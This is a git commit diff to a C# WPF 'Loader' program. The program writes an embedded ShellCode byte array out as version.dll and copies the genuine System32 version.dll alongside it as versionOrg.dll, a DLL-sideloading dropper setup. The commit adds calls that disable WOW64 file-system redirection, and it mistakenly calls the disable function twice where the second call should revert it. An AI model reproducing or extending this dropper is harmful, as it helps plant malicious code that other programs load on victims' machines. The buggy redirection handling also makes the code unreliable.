dd8dafc21ce03a6a5175d2b8a4d74491e7d8aac7
jx zh <2967529593@qq.com>
2023-07-12 12:35:15 +0800

    edit

--- Loader1/MainWindow.xaml.cs
+++ Loader1/MainWindow.xaml.cs
@@ -16,11 +16,18 @@ using System.IO;
 using System.Diagnostics;
 using Microsoft.Win32;
 using System.Collections;
+using System.Runtime.InteropServices;
 
 namespace Loader
 {
+
     public partial class MainWindow : Window
     {
+
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);
+        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);
         public MainWindow()
         {
             InitializeComponent();
@@ -28,8 +35,11 @@ namespace Loader
 
         private void Button_Click(object sender, RoutedEventArgs e)
         {
+            IntPtr oldWOW64State = new IntPtr();
+            Wow64DisableWow64FsRedirection(ref oldWOW64State);
             File.WriteAllBytes(Environment.CurrentDirectory + "\\version.dll", ShellCode.byteArray);
             File.Copy("C:\\Windows\\System32\\version.dll", Environment.CurrentDirectory + "\\versionOrg.dll");
+            Wow64DisableWow64FsRedirection(ref oldWOW64State);
             MessageBox.Show("Done!");
             Environment.Exit(0);
         }
